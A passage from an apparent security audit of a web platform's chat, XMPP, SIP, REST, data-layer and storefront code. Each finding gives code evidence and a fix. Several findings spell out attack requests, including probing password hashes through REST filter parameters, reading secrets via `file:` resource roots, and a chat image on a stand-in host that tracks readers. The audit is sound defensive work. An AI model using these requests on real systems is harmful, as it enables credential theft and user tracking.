- **Suggested fix:** Check `enabled` and the credentials from the headers before reading the body, cap the body of methods other than PUT at a small size, and spool a PUT to disk.

#### SEC-FIL-08. `/resources` lets `ADMIN` read any file the server's user can read, in production too

Medium; reported (to check).

- **Where:** `webroot.xml:257-272`; `crates/moqui-dav/src/elfinder.rs:756-759`
- **Reached by:** a member of `ADMIN`, `GET /resources?resourceRoot=file:/<dir>&cmd=get&target=<hash>` or `cmd=file`.
- **What happens:** `resourceRoot` is a request parameter and the production rule restricts write commands only. With a `file:` or `runtime://` root, `get` and `file` return file content, which includes `runtime/.env` (the host key, cluster and encryption keys, database passwords). The map treats conf editing as needing the sealed `CONF_EDIT` because the conf is that sensitive; this route gives `ADMIN` the secrets without it.
- **Evidence:** `webroot.xml:258` `<parameter name="resourceRoot"/>`; `elfinder.rs:756-759` `"get" => { let entry = self.entry(&location)?; response.insert("content".to_string(), Value::string(self.read_text(&entry)?)); }` with no `write_refused` call; `elfinder.rs:781` `writes_restricted` is the only production rule.
- **Not confirmed:** `context/locate.rs` `file_path` was not read, so whether a `file:` location may be absolute or leave the runtime directory is not confirmed. The map already says the route "reads and writes the `resourceRoot` it is given (`component://`, `file:` included)".
- **Suggested fix:** In production accept only `dbresource://` and `git://` roots for every command, or require a sealed permission for `file:`, `runtime://` and `component://` roots.

## Calls, chat and messaging

#### SEC-COM-01. Any Comms user lists every account and can message or add it; only calls ask the apps who may be reached

Medium; reported (confirmed in code).

- **Where:** `runtime/components/base/basic-comms/service/org/moqui/comms/CommsServices.xml:17-45`; `runtime/components/base/framework/service/org/moqui/chat/ChatServices.xml:1334-1340` (`create#Room`), `:1625-1629` (`add#Member`)
- **Reached by:** any signed-in user who may open the Comms screens (`BASIC_COMMS_USERS`, or an app's root that mounts them), `GET .../Chat/searchUsers?term=`, `.../Calls/searchUsers`, `.../Calls/History/searchUsers`; then `.../Chat/createDirect` or `.../Chat/addMembers` with any `userId`.
- **What happens:** `search#Users` reads `UserAccount` with authorization disabled and answers the id and name of every enabled account (an empty term matches all, 50 a call, so a few letters walk the directory), with no organization, provider or `EXTERNAL_USER` check. `create#Room` and `add#Member` then take any enabled account as a member without that account's consent, which also puts the two in each other's `/ChatKeys` reach and presence pushes. Calls do ask the apps (`call-target`, IronStone: the user's organizations) and answer a refused callee "as a user that does not exist", but the Calls picker lists that same user, and chat has no such hook, so in a deployment with several organizations a user of one finds and messages the users of another. mr-boss overrides `searchUsers` only on `Inbox/Mail.xml`.
- **Evidence:** `CommsServices.xml:31` `<entity-find entity-name="moqui.security.UserAccount" list="accountList" limit="${pageLimit}" disable-authz="true">`
- **Evidence:** `ChatServices.xml:1625-1628` `const found = new Set(Array.from(ec.entity.find('moqui.security.UserAccount').condition('userId', 'in', targets)...disableAuthz().list())...)` `if (missing.length) { ec.message.addError(`User ${missing.join(', ')} not found`); return }`
- **Evidence:** `Calls.js:738-739` `// an app's call-target providers may keep the people called to the user's own (the same answer as for no such user)` `if (refusedTargets(invitees).length) return refuse('noCallee', 'Choose someone to call')`; `grep -rn "call-target\|chat-target"` over `chat/` finds nothing.
- **Evidence:** `runtime/components/addon/mr-boss/screen-extend/basic-comms/screen/BasicComms/Inbox/Mail.xml:22-24` is the only `searchUsers` override found in mr-boss.
- **Not confirmed:** whether IronStone keeps users of different organizations out of each other's reach some other way (an entity filter on `UserAccount` does not apply: authorization is disabled); whether an external user can be a `BASIC_COMMS_USERS` member in any app; the XMPP side says an external user "learns only the usernames of the people of their own rooms", which this search does not follow.
- **Suggested fix:** Ask a provider hook (the `call-target` one, or a `chat-target` beside it) in `search#Users`, `create#Room`, `add#Member` and the mention lists, and leave external users out of the search for anyone, and out of its answers for an external caller.

#### SEC-COM-02. A chat message may carry an external image, so a sender learns each reader's address and when they read

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-lib/src/safe_html.rs:30-36`; `runtime/components/base/framework/service/org/moqui/chat/ChatServices.xml:2182,2296`; `runtime/components/base/basic-comms/screen/BasicComms/Chat.qvue:380-381`
- **Reached by:** any member of a room, `POST .../Chat/send` with `body=<p><img src="https://host.example/x.png?u=1"></p>`; every other member's browser loads it when the room shows the message.
- **What happens:** The body is cleaned with ammonia's defaults plus three `span` attributes, and the room renders it with `v-html`. `send#Message` treats a body with only an `<img>` as not empty, so images in bodies are expected, and nothing limits `src` to this server. The default `Content-Security-Policy` has no `img-src`. The link preview code avoids exactly this ("no picture is read, so no reader's address reaches a third party"), and read receipts are a user's choice (`CHAT_READ_RECEIPTS`), which a remote image gets around. The same holds for an encrypted room: the client's DOMPurify list allows `img` with `src`.
- **Evidence:** `safe_html.rs:33-34` `let mut builder = ammonia::Builder::default();` `builder.add_tag_attributes("span", &["data-mention-id", "data-record-entity", "data-record-id"]);`
- **Evidence:** `ChatServices.xml:2296` `const emptyBody = !bodyText && !/<img\b/i.test(html)`
- **Evidence:** `Chat.qvue:381` `v-html="item.bodyHtml" @click="room.bodyClick($event)"></div>`
- **Evidence:** `runtime/components/base/webroot/screen/webroot/js/WebrootChat.js:665-670` `ALLOWED_TAGS: [..., "i", "img", "ins", ...]`, `ALLOWED_ATTR: [..., "alt", "src", ...]` with the comment "what the server lets into a plain room's message (allow-html="safe", ammonia's defaults and the mention and record spans) and no more"
- **Evidence:** `runtime/components/base/framework/conf/MoquiDefaultConf.xml:827` `<response-header type="screen-render" name="Content-Security-Policy" value="frame-ancestors 'none'; form-action 'self';"/>`
- **Evidence:** ammonia 4.2.5 `src/lib.rs:383` (default tags) `"header", "hgroup", "hr", "i", "img",`; `:413-414` `"img" => hashset![ "align", "alt", "height", "src", "width"`; `:455` `"https",` (default URL schemes), read in the cargo registry copy.
- **Not confirmed:** whether `Chat.qvue` rewrites `img` sources before showing a body (`decorateBody` at line 287 only rewrites mention spans); the referrer policy.
- **Suggested fix:** In chat bodies keep only images whose `src` is this server's own image route (`richTextImage`), or drop `img` from chat's cleaner and the client's list; or send an `img-src 'self' data: blob:` policy on the app pages.

#### SEC-COM-11. `ipAllowed` is not checked for XMPP sign-in or its service calls

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-host/src/xmpp/mod.rs:596-603`; `crates/moqui-core/src/user/login.rs:1451-1456`
- **Reached by:** a user whose account or group has `ipAllowed` set, or anyone holding that user's app password, from any address, over `xmpp_port`, `xmpp_tls_port` or `/xmpp-websocket`.
- **What happens:** The session's sign-in (SCRAM, FAST) never calls a login function, and each service call logs the user in with `internal_login_user(username)` on a worker that has no request and no `with_client_ip`. `check_ip_allowed` returns Ok for an empty address. The session reads and writes the user's chat from an address the account is not allowed to sign in from. DAV, SSH, the LLM gateway, A2A and the terminal pass the client address; XMPP does not.
- **Evidence:** `mod.rs:600` `if let Err(err) = moqui_core::user::internal_login_user(username) {`; `login.rs:1454-1456` `if client_ip.is_empty() { return Ok(()); }`; `crates/moqui-dav/src/dav/mod.rs:285` `let logged_in = moqui_core::user::with_client_ip(&request.client_ip, || {` (the pattern XMPP lacks). `Caller::User(String)` carries the username only (`crates/moqui-xmpp/src/backend.rs:33`).
- **Not confirmed:** whether `crate::web::current_client_ip()` can be non-empty on a pool worker from an earlier job (it is the request's; not traced). Not run.
- **Suggested fix:** Carry the session's peer address in `Caller::User` and wrap `run_service` (and the sign-in lookups) in `with_client_ip`; refuse the SASL exchange when `ipAllowed` does not match.

#### SEC-COM-12. A connected XMPP app keeps a locked account locked

Medium; reported (likely).

- **Where:** `crates/moqui-core/src/user/login.rs:1303-1310`, `1736-1746`; `crates/moqui-xmpp/src/session/mod.rs:505-517`; `XmppServices.xml:87`
- **Reached by:** anyone who can make three failed web sign-ins for a username (the default `max-failures`), while that user has an XMPP app connected.
- **What happens:** Three bad passwords lock the account for 5 minutes (`disable-minutes`). `check#Credential` passes a locked account (its `disabledDateTime` is in the past), so the XMPP session stays. Every service call of the session (the presence heartbeat each 60 seconds, each stanza, each push that looks a room up) runs `internal_login_user`, whose gate counts a failed login for an account that is still disabled, and a count over the maximum writes `disabledDateTime` to now. The lock starts again each minute and does not end while the app stays connected; the web sign-in stays refused.
- **Evidence:** `login.rs:1305-1309` `if still_disabled(account, now) { if !user_id.is_empty() { increment_failed(facade, &user_id)?; } return Err(Error::new(INVALID_LOGIN)); }`; `login.rs:1736-1743` `let disable = next > policy::max_failures(); ... let when = if disable { now_value() }`; `session/mod.rs:512-516` `.call(services::HEARTBEAT, json!({"idleSeconds": ...}))`; `MoquiDefaultConf.xml:912` `<login max-failures="3" disable-minutes="5" history-store="true"/>`.
- **Not confirmed:** `internal_login` reads the account through the entity cache (`find_username_cached`, `login.rs:1642-1647`) and `increment_failed` writes with raw SQL; whether the cached row shows the lock on the node that runs the XMPP calls was not traced. Not run. The same gate serves DAV app passwords and queued work, which belongs to the identity slice.
- **Suggested fix:** Do not count a failure in `gate_account` for an internal login (no credential was tried); end an XMPP session, or skip its service calls, while the account is locked.

#### SEC-COM-13. TURN: usernames from unauthenticated requests are kept without bound

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-rtc/src/turn/mod.rs:473-492`
- **Reached by:** anyone who can send a datagram to `turn_port` or open one of the TURN TCP or TLS connections (TURN is off by default; UDP sources can be forged).
- **What happens:** `admit_message` runs before the server checks MESSAGE-INTEGRITY. For any request whose USERNAME has the form `<future expiry>:<text up to 192 bytes>`, it computes the password and calls `add_user` on every listener's `TurnServer`, and inserts the name in `self.users`. Nothing removes a name from `users` or from the servers (grep of `users.remove`, `users.retain`, `remove_user` in the file: none), so each distinct forged username grows memory for the life of the process. Honest credentials also stay after they expire.
- **Evidence:** `mod.rs:476` `let good = leg_of(username, unix_now()).filter(|leg| !self.is_revoked(leg));` `:480-491` `if !self.users.contains(username) { let pass = good.map(|leg| self.password_of(username, leg)).unwrap_or_default(); for server in &mut self.servers { server.add_user(username.clone(), pass.clone()); } ... self.users.insert(username.clone()); }`; the comment at `:474-475` "one it has (it expired or its leg was revoked since) is dropped, since the server would still take it".
- **Not confirmed:** `turn-server-proto` was not read (whether `add_user` has a cap of its own). The UDP loop has no per-source rate limit (`crates/moqui-host/src/rtc/turn.rs:463-470`). Not run.
- **Suggested fix:** Add a user only after the server's 401 challenge was answered with a valid nonce, or cap and expire the table (drop a name at its expiry, bound the count, per-source rate on UDP).

#### SEC-COM-14. A file uploaded over XMPP outlives the deletion and retention of its message

Medium; reported (confirmed in code).

- **Where:** `ChatServices.xml:2807-2811`, `3235`; `XmppServices.xml:699`, `743`; `crates/moqui-host/src/xmpp/upload.rs:181-187`
- **Reached by:** any holder of the upload URL (the uploader, every XMPP reader of the room, anyone it was passed to), after the message was deleted (`redact#Message`) or removed by room retention.
- **What happens:** `attach#Upload` makes the chat file on the upload's own location, `dbresource://xmpp-upload/...`. `clear#MessageContent` deletes a stored file only when its location starts with the chat root (`dbresource://chat/`), so this file stays; the `XmppUpload` row stays too, since `clean#Uploads` removes only slots never put. The URL goes on serving the file with no expiry. A file uploaded in the web client is under the chat root and is deleted.
- **Evidence:** `ChatServices.xml:2807` `const chatRoot = (System.getProperty('chat_attachment_root') || 'dbresource://chat').replace(/\/+$/, '') + '/'` `:2809` `try { if (file.location && String(file.location).startsWith(chatRoot)) ec.resource.getLocationReference(file.location).delete() }`; `XmppServices.xml:699` `location: upload.location`; `XmppServices.xml:743` `.condition('completedDate', null).condition('createdDate', '<', hourAgo)`.
- **Not confirmed:** the rest of `redact#Message` and `clean#RoomRetention` (only `clear#MessageContent` was read; its description says both call it). Not run.
- **Suggested fix:** In `clear#MessageContent` and `clean#PendingAttachments` also delete a file under the XMPP upload root when no other `ChatAttachment` has the location, and delete the `XmppUpload` rows of the file (by `location` or `chatAttachmentId`).

#### SEC-COM-25. A forged-source digest failure blocks a trunk's or a phone's address

Medium; reported (likely).

- **Where:** `crates/moqui-sip/src/ua.rs:1871-1888` (failure counting), `ua.rs:469` (the block), `crates/moqui-lib/src/source_guard.rs:121-146`
- **Reached by:** anonymous, over UDP (`sip_port` set), from a network that lets it forge source addresses. Five REGISTER datagrams (registrar on) or INVITE datagrams (source not a trunk's) that carry any `Authorization` / `Proxy-Authorization` header, sent with the victim's address as source.
- **What happens:** A failed answer is counted against the datagram's source address with no proof the source sent it: the nonce need not be one this server issued, and a nonce is not bound to an address. After `authFailureLimit` (5) the address is blocked for `authBlockSeconds` (an hour), on every transport, since the block is by address. With the registrar on, the victim can be a provider trunk's signaling address (a REGISTER is authenticated whatever its source), which drops the trunk's inbound INVITEs and its responses to this server's REGISTER and INVITE, also over the trunk's TLS connection. A phone's NAT address or a PBX that signs in by digest can be blocked the same way with the registrar off (INVITE). The block is written to `VoiceAuthFailure` and reloaded after a restart.
- **Evidence:** `ua.rs:1873-1875` `let blocked = match source { Some(source) => { let failure = lock(&self.guard).failure(source.ip(), Instant::now());`; `ua.rs:1759-1762` `if method == Method::Register { if self.phones.is_some() { ... self.register_phone(tx, source).await;` (no trunk-address test before it); `ua.rs:1827` `None => Some((lock(&self.nonces).verify(auth, &method, None, now_secs()), None)),`; `digest.rs:396-398` `let Some(issued) = self.issued_at(&auth.nonce) else { return Verdict::Invalid; };` (a nonce this server never issued is a counted failure); `digest.rs:334-338` `mac.update(&time.to_be_bytes()); mac.update(salt); mac.update(self.realm.as_bytes());` (no address in the MAC); `ua.rs:469` `if lock(&self.guard).is_blocked(addr.ip(), now) { return None; }` (all transports, trunk addresses included); `source_guard.rs` has no exemption list (grep `exempt|trusted|trunk`: nothing).
- **Not confirmed:** not run. Whether rsipstack drops a datagram whose Via does not match its source before the transaction is made was not read. The map already says a UDP source can be forged (old line 965-966) but only for a trunk taken by address.
- **Suggested fix:** Count a failure only when the answer's nonce was issued by this server to that same source (put the source address in the nonce MAC), so a forged source cannot answer; and never block an address that is a trunk's target or listed inbound address.

## Data layer and stored secrets

#### SEC-DAT-01. A find by request parameters takes conditions and order on password-hash and encrypted fields

Medium; confirmed (second check).

- **Where:** `crates/moqui-entity/src/entity/search_form.rs:189-195`, `:86-92`; callers `crates/moqui-entity/src/entity/query_rest.rs:561-563`, `crates/moqui-core/src/service/rest.rs:708-711`, `:752-755`, `crates/moqui-core/src/script/host/entities.rs:193-197`
- **Reached by:** a signed-in user with view authorization on `moqui.security.UserAccount`, on a view that aliases its fields (`UserAccountAndGroup`), or on any entity with an encrypted field, through `GET /rest/e1/<entity>?currentPassword_op=begins&currentPassword=<prefix>`, a Service REST entity `list` or `count`, or a screen with `<search-form-inputs>` (Tools `System/Security/UserAccount/UserAccountList.xml:39-40`).
- **What happens:** The result omits the password fields, but the condition is applied, so the row count answers whether a user's stored hash starts with the given text. Repeating it reads the whole argon2 string, or a `resetPassword` or `passwordSalt`. `orderByField=currentPassword` sorts by the hash. On an encrypted field an `equals` condition is sealed with the constant IV, so it confirms a guessed value.
- **Evidence:** `search_form.rs:189-193` `for field in fields { let name = field.name.as_str(); if skip.contains(name) { continue; } ... if input.contains_key(name) || input.contains_key(&op_key) {`; `entities.rs:197` `return this.searchFormMap(inputs, null, null, second, third === true);` (no skip list); `query_rest.rs:228-231` strips the result only; `grid.rs:316-318` is the one caller that refuses (`hidden_value`).
- **Not confirmed:** which groups other than `ADMIN` hold view authorization on a `UserAccount` entity or view in a shipped component (the base seed gives entity REST none; mr-boss screens were not searched beyond a grep of `search-form-inputs`).
- **Suggested fix:** In `search_form_map`, skip `sensitive::secret_fields` of the entity and its encrypted fields for conditions and order, as `grid.rs` `hidden_value` does, unless the caller names the field explicitly.
- **Re-check:** The mechanism is confirmed: no field filter in `search_form.rs`, `sensitive.rs` or the REST callers, which pass an empty skip list; `grid.rs` `hidden_value` is the one caller that refuses. On an encrypted field `equals` confirms a guessed value; a `begins` pattern is sealed whole and is no prefix test. Who other than `ADMIN` holds view on a `UserAccount` entity or view was not traced.

#### SEC-DAT-02. An encrypted field in a data document is indexed in plaintext

Medium; likely (second check).

- **Where:** `runtime/components/addon/mr-mantle/data/MantleDocumentData.xml:55`; `crates/moqui-entity/src/entity/query_rest.rs:1414`; `crates/moqui-db/src/model/view.rs:549`
- **Reached by:** anyone who can search the `mantle` index for parties, and anyone who reads the search store or a dump that includes it.
- **What happens:** `MantleParty` lists `identifications:idValue`, which is `PartyIdentification.idValue` (`encrypt="true"`, a party's identification number). The document's view alias inherits `encrypt`, the feed reads the view with authorization disabled, and each row is decrypted before the document is built. The `MantleSearch` feed pushes it to `index#DataDocuments` in real time. Nothing in `document.rs` or `sensitive.rs` leaves an encrypted or password field out of a document.
- **Evidence:** `MantleDocumentData.xml:55` `<fields fieldSeqId="18" fieldPath="identifications:idValue"/>`; `PartyEntities.xml:462` `<field name="idValue" type="text-medium" encrypt="true"/>`; `query_rest.rs:1414` `let row = field_rw::after_read(facade, &self.view, mapped)?;`; `document.rs:864` `let _authz = (crate::hooks::get().disable_authz)();`; `MantleDocumentData.xml:380-383`.
- **Not confirmed:** `crates/moqui-core/src/search/` was not read, so whether the index writer drops any field, and who may query the index, are not traced. `grep` finds no `encrypt` in `document.rs`, `search/feed.rs`, `search/mod.rs` or `search/query.rs`.
- **Suggested fix:** Leave encrypted fields and `sensitive::secret_fields` out of a document when it is built, or refuse a `DataDocumentField` on one; remove `identifications:idValue` from `MantleParty`.
- **Re-check:** `crates/moqui-report/src/business.rs:790-820` refuses an encrypted field for a report dataset only; nothing does so for a document or the feed. The index write in `crates/moqui-core/src/search/` and who may query the index were not read.

#### SEC-DAT-03. REST entity reads return stored credentials in plaintext

Medium; confirmed (lead).

- **Where:** `runtime/components/base/tools/service/moqui.rest.xml:123-126`, `:179-183`; `crates/moqui-core/src/service/rest.rs:714-723`; `crates/moqui-entity/src/entity/query_rest.rs:499-544`
- **Reached by:** a member of `ADMIN` (the `/moqui` REST path grant) with `GET /rest/s1/moqui/email/servers`, `GET /rest/s1/moqui/entity/syncs`; and any caller with `AT_ENTITY` view on an entity that has an encrypted field, with `GET /rest/e1/<entity>`.
- **What happens:** The reply holds `EmailServer.mailPassword`, `.smtpPassword`, `.oauthRefreshToken` and `EntitySync.targetPassword` decrypted. Entity REST refuses the restricted entities (`EmailServer`, `SystemMessageRemote`, `DatabaseConnection`, `UserAuthcFactor`) but has no check of `encrypt`, so the other encrypted fields (`LlmEndpoint.apiKey`, `GitRepository.accessToken`, `OauthFlow.secret`, `InstanceHost.password`, `AcmeCertificate.privateKeyPem`, `CreditCard.cardNumber`) come back in plaintext. The map says an administrator reads only whether a secret is set.
- **Evidence:** `service/rest.rs:660-666` only identity-admin and audit entities are refused for `list`, `one`, `count`, with the comment "secret-config reads are allowed on a declared resource"; `:717-721` `row.fields().iter().filter(|(_, value)| !value.is_null()).map(...)`; `query_rest.rs` has no occurrence of `encrypt`.
- **Not confirmed:** whether the `default` master of `EmailServer` or `EntitySync` narrows the fields (the `list` methods use no master).
- **Suggested fix:** Mask or drop `encrypt` fields in `render_record` and in `find_entity`, as the grid does, and answer a `<field>IsSet` flag.
- **Re-check:** Read `crates/moqui-core/src/service/rest.rs` (the entity `list` and `one` of a declared resource return every non-null field; only identity-admin and audit entities are refused) and `moqui.rest.xml` (`email/servers` is `EmailServer` `list`). Confirmed for Service REST, likely for Entity REST (which groups hold entity view on entities with encrypted fields was not traced). Read `run_entity`, `find_entity`, the `sensitive.rs` lists and `query_rest.rs` `rest`: neither REST path uses `field.encrypt`; only the five `UserAccount` password fields are stripped. `SecurityRest.spec.js:337-346` shows a non-ADMIN fixture with the `MOQUI_API` grant listing `/rest/s1/moqui/email/servers`. The public demo keeps `ADMIN` view on `/moqui`.

#### SEC-DAT-04. A view alias function from a database row may be any SQL function name

Medium; likely (second check).

- **Where:** `crates/moqui-db/src/sql/view.rs:1195-1209`; `crates/moqui-entity/src/entity/derived.rs:295-296`; `crates/moqui-entity/src/entity/document.rs:627`; `runtime/components/base/tools/screen/Tools/Data/Views/EditDbView.xml:61`, `:117`
- **Reached by:** a user who can write `DbViewEntityAlias` or `DataDocumentField` rows (Tools Data Views and Data Documents; `Dashboards/DatasetFields.xml:20` also passes `functionName`), then any find of that view.
- **What happens:** `functionName` is checked to be one word and is written as `<NAME>(<column>)`. On the embedded cluster the connection is the bootstrap superuser, so a function such as `pg_read_file` or `pg_ls_dir` runs on a column the same user can fill. The SQL runner has its own permission (`DATABASE_ADMIN`) and audit; this path has neither.
- **Evidence:** `view.rs:1204-1206` `fn check_word ... function.chars().all(|ch| ch.is_ascii_alphanumeric() || ch == '_')`; `:1200` `Ok(format!("{}(", function.to_ascii_uppercase()))`; `EditDbView.xml:117` `if (functionName) aliasValue.functionName = functionName`.
- **Not confirmed:** who is authorized for `EditDbView.xml`, the Dashboards dataset screen and `create#DataDocumentField` (only `ADMIN` was assumed); whether a later check rejects a non-aggregate function on a plain column.
- **Suggested fix:** For views built from rows (`derived.rs`), accept only a fixed list (`min`, `max`, `sum`, `avg`, `count`, `count-distinct`, `upper`, `lower`).
- **Re-check:** The Dashboards dataset path is refuted (`business.rs:889-892` accepts only its `FUNCTIONS` list). The Tools Data Views and Data Documents paths stand: no allow list in `derived.rs`, `document.rs` or `model/view.rs`. Who is authorized for those Tools screens, and whether Postgres runs a non-aggregate function there, were not tested.

## PASS frontend (mr-pass)

#### SEC-PSF-01. In local mode a login key in a header drives every PASS page, without the session token

Medium; reported (likely).

- **Where:** `service/pass/Facade.js:25-32`; `crates/moqui-core/src/screen/mod.rs:1123-1128`; `crates/moqui-core/src/screen/render.rs:1702`; the rule that is skipped is `mr-mantle/script/PassAuthority.js:379-386`.
- **Reached by:** anyone holding an account's unscoped login key (a Smithy access token made for git, an installed app's device key, a session's key), with any POST to a PASS page transition on a site served in local mode, sending the key as `api_key` or `login_key`.
- **What happens:** The authority's rule is that a login key calls only the installed app's operations and only as a device key, and an access token calls none (`APP_KEY_OPERATIONS`). That rule is in `run()`, which a local-mode page never calls: the page's transition calls the Mantle service directly as the key's user. A header login also skips the transition's session-token check. So a git access token can post in the forum, change the account's settings, read its invoices, orders and private messages, and run every Smithy form that asks for no password; in remote mode the same token is refused.
- **Evidence:** `PassAuthority.js:379-386` `if ((p.headerKey || p.headerLogin) && (keyKind(p.headerKey) !== 'device' || !APP_KEY_OPERATIONS.includes(operation))) fail('Unauthorized', "accessDenied: A login key calls only an installed app's operations, and an access token none; sign in to the site")`
- **Evidence:** `Facade.js:26-32` `if (!backend) return ec.service.sync().throwOnError(true).name(def.service).parameters({ input }).call().result`
- **Evidence:** `screen/mod.rs:1123-1127` `match user::apply_header_keys(request.header("api_key"), request.header("login_key")) { ... Ok(true) => { user::note_header_login(); return Ok((None, true)); }`; `user/login.rs:613-616` `if !key_scope.is_empty() && Some(key_scope.as_str()) != scope { return Err(...) }` (a key with no scope passes); `render.rs:1702` `if !job.header_authenticated && !job.new_session && csrf_rejected(job, &transition)? {`
- **Evidence:** grep for `loginKeyKind`, `moquiHeaderLogin`, `headerLogin` in `mr-pass` (outside `test/`): no match; in `mr-mantle/service`: no match.
- **Not confirmed:** that the access tokens `mantle.smithy.SmithyServices.create#AccessToken` makes are `UserLoginKey` rows with an empty `scope` (the comment at `PassAuthority.js:306-309` says an access token is a key with a description; the service was not read). Whether any Mantle service checks the key kind itself (the grep above found none). `addSshKey` and `createAccessToken` take `password` and `code` fields (`SmithySchema.js:239-250`), so new credentials may need re-entry; not traced.
- **Suggested fix:** Apply the login-key rule where both modes pass: in `Facade.call` when `pass_backend_url` is empty (refuse when `ec.user.loginKeyKind` is set, or the session came by a header login, unless the operation is in `APP_KEY_OPERATIONS` and the key is a device key), or in a shared Mantle helper each operation's entry calls.

## PASS authority and public accounts

#### SEC-PSA-01. PASS sign-in has no rate limit on the authority

Medium; reported (confirmed in code).

- **Where:** `FW/service/org/moqui/public/Account.js:536-537`; `FW/conf/MoquiDefaultConf.xml:869`; `runtime/conf/pass/MoquiAuthorityConf.xml:30-37`
- **Reached by:** anonymous, `POST /rest/s1/pass/v1/sites/{any}/account/session` (or `account/challenge`) with a business-host session and its `x-csrf-token`; or through a PASS frontend, whose calls carry no session token.
- **What happens:** Registration, verification and recovery are counted per requester and per address; sign-in is not. The web protection's `login` rule names `/Login`, `/rest/login` and `/SecondFactor` only, and the example authority conf exempts the PASS servers' addresses from web protection, so their visitors' failed sign-ins meet neither the rate limit nor the `auth-failure` ban. What is left is the account's own failed-login count, which does not stop one guess each across many accounts, staff accounts included (one `UserAccount` table).
- **Evidence:** `if (op === 'startSession' || op === 'completeSession') return startSession(p)` (no `throttle`), against `if (op === 'beginRegistration') { throttle('registration', p.emailAddress)`; `<rate-limit name="login" path="/Login/**,/rest/login,/rest/login/**,/SecondFactor/**" methods="POST" requests="10" seconds="60" burst="10"/>`; `<client-rule name="pass-servers" action="exempt" cidr="10.0.2.0/24"/>` with the comment "the PASS servers are exempt, or all their visitors would count as one client".
- **Not confirmed:** the PASS frontend's own limits (slice 14). The `all` rule (50 a second) and the `auth-failure` ban still count a direct caller when web protection is on (`webapp_web_protection` is empty by default; on with `webapp_trusted_proxies`, per the conf comment).
- **Suggested fix:** Call `throttle('session')` in `startSession` (per requester key, and per user name), as the other account actions do, and add the servlet's `account/session` and `account/challenge` paths to the `login` rule.

## PASS application services (Mantle)

#### SEC-PSS-01. A download product's file location is not restricted

Medium; reported (likely).

- **Where:** `M/product/ShopFulfillment.js:118`, `:525`, `:612`; `M/product/ProductServices.xml:937`, `:958`
- **Reached by:** a staff user who may call `mantle.product.ProductServices.create#ProductContent` (or update the row), then any buyer of that product through `getShopDownload`.
- **What happens:** The file a granted download streams is `ProductContent.contentLocation` of a `PcntDownload` row. `create#ProductContent` takes `contentLocation` as an input and stores it as given. The download path applies no scheme or path rule, and the frontend opens the location with authorization off, so a row naming `file:///...` or a `component://` path would stream a server file to the buyer. The product image path has exactly this guard and the download path does not.
- **Evidence:** `M/product/ShopFulfillment.js:118` `rows("mantle.product.ProductContent", {productId, productContentTypeEnumId: "PcntDownload"})` then `.filter(row => lib.active(row) && row.contentLocation)`
- **Evidence:** `M/product/ShopFulfillment.js:612` `location: content.contentLocation,`
- **Evidence:** `M/product/ProductServices.xml:937` `<parameter name="contentLocation"/>`; `:958` `<service-call name="update#mantle.product.ProductContent" in-map="{productContentId:productContentId, contentLocation:contentLocation}"/>`
- **Evidence:** `M/product/ShopCatalog.js:341` `/^(?:dbresource|component):\/\//.test(String(row.contentLocation)) &&` (the image path's rule)
- **Evidence:** `crates/moqui-core/src/context/locate.rs:88` `/// A local path for a classpath://, component://, file:, or plain location.`
- **Not confirmed:** whether the reference a script opens refuses `file:` or absolute paths (the read path in `crates/moqui-core/src/script/host/tools.rs` was not traced); which permission `create#ProductContent` needs; whether the same staff user can already read such a location through a BOSS content download.
- **Suggested fix:** Apply the image rule to `PcntDownload` rows in `downloadContents` and `getDownloadFile` (a `dbresource://` location under the content root, no `..`), and refuse a caller-given `contentLocation` in `create#ProductContent`.

#### SEC-PSS-21. `createCustomerCase` leaves the staged upload on disk when the operation is a repeat

Medium; reported (confirmed in code; a helper reader's item, not checked by the slice's reviewer).

- **Where:** `request/SupportPortal.js:758-765`, `:775`, `:833`
- **Reached by:** anonymous, through a registered PASS frontend, with a queue's public form token (`CaseIntake`, the public NewCustomerCase link); also any signed-in customer account. Request: `createCustomerCase` (POST `support/cases`) with a `file`, repeating one `operationId` with the same name and email.
- **What happens:** the file is staged and scanned before the operation key is looked up. When the key was used before with the same request hash (the hash does not include the file), `intakeCase` and `contactCase` return the first result and nothing removes the staged file; the `catch` in `createCustomerCase` unstages only on an error. Each repeat leaves up to 10 MiB under `pass_media_root/support`, 30 times in ten minutes per requester address, with no further limit (the form's hourly and address limits are in `create#IntakeRequest`, which a repeat never reaches).
- **Evidence:** `:758` `const staged = media().stageGiven(p.file, "file", "support")`; `:759-765` `try { if (!blank(p.token)) return intakeCase(…); return contactCase(…) } catch (error) { media().unstage(staged); throw error }`; `:770-775` `const operation = lib.operation({operationKey: key}, "SupportCaseIntake", organizationPartyId, {token: …, name: p.requestName, email: p.emailAddress})` / `if (operation.old) return lib.previous(operation)`; `:833` `if (operation.old) return lib.previous(operation)`
- **Not confirmed:** a job that sweeps `pass_media_root/support` (none found by `grep -rn pass_media_root` in mr-mantle and `crates/`); the scanner must pass the file (a valid image passes the sniff).
- **Suggested fix:** look the operation up before staging, or unstage in a `finally` whenever the file was not kept.

#### SEC-PSS-41. An anonymous event reservation answers the directory name of the party that owns a typed email address

Medium; reported (confirmed in code; a helper reader's item, not checked by the slice's reviewer).

- **Where:** `service/mantle/marketing/MarketingPortal.js` reserveRegistration (starts 1058), registrationView (starts 961), subscriberOf (198-231); `service/mantle/work/EventRegistrationPlaces.js:76-81`, `:276-282`, `:394`, complete (starts 422)
- **Reached by:** anonymous, the PASS operation `reserveRegistration` on any site with a published, open event offer (`buyerEmail` is the input); also `completeRegistration` with an attendee's `email`.
- **What happens:** The buyer party is the first existing directory party with that current email address (not disabled, merged or private), else a new person. The first place's attendee is the buyer party, and the answer to the same request names each place's attendee with `partyName(attendeePartyId)`, the party's stored first and last name or organization name, not the name typed. A visitor learns whether an address is known to the organization's party directory and the name kept for it (a customer contact, a supplier contact, an employee). An attendee's address at completion is matched the same way.
- **Evidence:** `subscriberOf`: `if (party && party.disabled !== "Y" && !party.mergedToPartyId && !party.privateOwnerUserId) return {partyId: party.partyId, contactMechId: info.contactMechId}`
- **Evidence:** `EventRegistrationPlaces.js:394` `attendeePartyId: firstPlace ? p.buyer.partyId : null`
- **Evidence:** registrationView `attendeeName: row.attendeePartyId ? P.partyName(row.attendeePartyId) : ""`; reserveRegistration returns `registrationView(reservation, policy, "token", {buyerName: buyer.name})`
- **Evidence:** `EventRegistrationPlaces.js` complete `: personOf(person.name, person.address)` then `attendeePartyId: party.partyId`
